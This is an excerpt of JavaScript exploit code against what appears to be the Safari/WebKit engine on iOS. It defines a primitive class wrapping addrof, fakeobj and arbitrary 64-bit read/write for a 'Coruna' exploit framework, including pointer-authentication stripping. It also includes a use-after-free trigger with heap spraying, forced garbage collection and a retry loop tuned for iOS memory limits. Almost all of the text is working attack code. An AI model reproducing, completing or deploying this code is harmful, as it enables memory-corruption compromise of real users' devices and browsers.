...
class ChimeraExploitPrimitive {
   ...
   *
   * NOTE: Coruna framework uses plain Number for addresses throughout.
   * utilityModule.T(lo, hi) = lo + 0x100000000 * hi → Number.
   * All public methods accept/return Number addresses. BigInt is used
   * only internally for the underlying read64/write64 primitives.
   */
  constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
    this._addrof = addrofFn;   // returns BigInt
    this._fakeobj = fakeobjFn; // takes BigInt
    this._read64 = read64Fn;   // BigInt → BigInt
    this._write64 = write64Fn; // (BigInt, BigInt) → void
    this._cleanup = cleanupFn;
    this.yr = false;
  }

  // Convert Number address → BigInt for internal use
  _toBig(addr) {
    if (typeof addr === "bigint") return addr;
    // Number addresses from Coruna are lo + hi*2^32 (always positive)
    if (addr < 0) addr += 0x100000000;
    return BigInt(Math.floor(addr)) & 0xFFFFFFFFFFFFFFFFn;
  }

  // --- Low-level reads (Coruna interface — all addrs are Number) ---

  read32(addr) {
    const val = this._read64(this._toBig(addr));
    return Number(val & 0xFFFFFFFFn);
  }

  write32(addr, val) {
    const a = this._toBig(addr);
  ...
  write64(addr, lo, hi) {
    ...
    if (hi !== undefined) {
      ...
      this._write64(a, this._toBig(lo));
    }
  }
  ...
  readByte(addr) {
    const a = this._toBig(addr);
    const aligned = a & ~7n;
    const byteOff = Number(a & 7n);
    const val = this._read64(aligned);
    return Number((val >> BigInt(byteOff * 8)) & 0xFFn);
  }
  ...
  readInt64FromOffset(A) {
    // A is a Number (from addrof + offset arithmetic)
  ...
  readRawBigInt(addr) {
    // Returns the Coruna-style Number: lo + hi * 2^32
    const a = this._toBig(addr);
    const val = this._read64(a);
    const lo = Number(val & 0xFFFFFFFFn);
    const hi = Number((val >> 32n) & 0xFFFFFFFFn);
    return utilityModule.T(lo, hi);
  }

  readDoubleAsPointer(addr, stripPAC) {
    const lo = this.read32(addr);
    let hi = this.read32(addr + 4);
    if (stripPAC || platformModule.platformState.versionFlags.zohDDd) {
      hi &= 0x7FFFFFFF;
    }
    return utilityModule.T(lo, hi);
  }
  ...
  // addrof: returns Number (Coruna convention: lo + hi * 2^32)
  addrof(obj) {
    const bigAddr = this._addrof(obj);
    const lo = Number(bigAddr & 0xFFFFFFFFn);
    const hi = Number((bigAddr >> 32n) & 0xFFFFFFFFn);
    return utilityModule.T(lo, hi);
  }

  fakeobj(val) {
    // val may be a Number address or an Int64-like; convert to BigInt for internal use
    if (typeof val === "bigint") return this._fakeobj(val);
    return this._fakeobj(this._toBig(val));
  }
...
// 1M elements is sufficient to push A to old space (vs 4M which wastes ~32MB)
const uafArray = new Array(0x100000).fill(1.1);
...
// Configuration — tuned to avoid memory pressure crash on iOS
const CONFIG = {
  JIT_WARMUP: 800,
  MAX_ATTEMPTS: 5000,
  SPRAY_PER_ATTEMPT: 32,
  ALLOC_MOD: 3,            // 1-3 GC buffers per attempt (was 1-5)
  INNER_K: 10,
  RECURSIVE_DEPTH: 400,    // shallower recursion (was 800)
  GC_BUFFER_SIZE: 0x200000, // 2MB per GC trigger (was 8MB)
  MAX_SPRAY_TOTAL: 8000,   // cap total spray arrays to limit memory
  YIELD_INTERVAL: 200,     // yield to event loop every N attempts
};
...
function triggerUAF(flag, k, allocCount) {
  ...
  for (let j = 0; j < allocCount; ++j) {
    forGC.push(new ArrayBuffer(CONFIG.GC_BUFFER_SIZE));
  }
  A.p2 = forGC;
...
function clearStack() { for (let i = 0; i < 20; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }
...
r.si = async function () {
  ...
  for (let k = 0; k < CONFIG.MAX_ATTEMPTS; ++k) {
    // Cap total spray arrays to prevent OOM
    if (uafReclaimed.length > CONFIG.MAX_SPRAY_TOTAL) {
      uafReclaimed.length = 0;
    }

    triggerUAF(false, CONFIG.INNER_K, (k % CONFIG.ALLOC_MOD) + 1);
    clearStack();
    for (let i = 0; i < 2; ++i) new ArrayBuffer(0x4000);
